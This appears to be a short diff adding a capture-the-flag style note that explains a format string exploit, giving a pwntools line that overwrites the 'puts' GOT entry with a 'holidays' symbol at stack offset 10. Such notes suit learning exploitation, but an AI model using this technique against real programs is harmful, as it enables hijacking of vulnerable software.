@@ -1,0 +1,5 @@
+use this payload to write anything in the got table using format string vulneriabiliti
+
+payload = fmtstr_payload(10, {elf.got['puts'] : elf.sym['holidays']})
+
+10 is offset where out input is went to stack
